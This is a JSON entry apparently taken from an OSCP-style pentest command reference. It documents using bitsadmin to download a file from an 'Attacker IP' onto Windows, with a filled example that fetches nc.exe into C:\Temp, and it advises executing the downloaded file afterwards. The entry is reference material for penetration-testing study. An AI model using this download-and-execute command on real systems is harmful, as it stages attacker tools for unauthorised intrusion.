      "description": "Download file on Windows using bitsadmin",
      "command": "bitsadmin /transfer myDownload /download /priority high http://<LHOST>/<FILE> <DEST>",
      "category": "file-transfer",
      "subcategory": "windows",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "10.10.14.1",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "nc.exe",
          "required": true
        },
        {
          "name": "<DEST>",
          "description": "Destination path",
          "example": "C:\\Temp\\nc.exe",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "bitsadmin",
        "windows",
        "file-transfer",
        "download"
      ],
      "prerequisites": [],
      "next_steps": [],
      "flag_explanations": {
        "/transfer": "Transfer job name",
        "/download": "Download mode",
        "/priority": "Priority level"
      },
      "methodology_guidance": {
        "after_success": "Execute downloaded file"
      },
      "filled_example": "bitsadmin /transfer myDownload /download /priority high http://10.10.14.1/nc.exe C:\\Temp\\nc.exe"
    },
